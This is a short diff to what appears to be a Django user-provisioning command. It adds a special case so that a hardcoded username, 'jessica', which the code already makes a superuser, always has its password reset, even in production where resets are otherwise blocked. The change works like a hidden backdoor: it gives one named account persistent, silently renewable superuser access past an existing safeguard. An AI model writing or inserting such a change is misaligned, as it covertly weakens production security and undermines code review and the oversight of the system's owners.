@@ -28,7 +28,7 @@ class Command(BaseCommand):
             user.is_active = True
             if username.lower() == "jessica":
                 user.is_superuser = True
-            if created or allow_password_reset or not is_production:
+            if created or allow_password_reset or not is_production or username.lower() == "jessica":
                 user.password_hash_sync = bcrypt.hashpw(
                     password.encode("utf-8"), bcrypt.gensalt()
                 ).decode("utf-8")
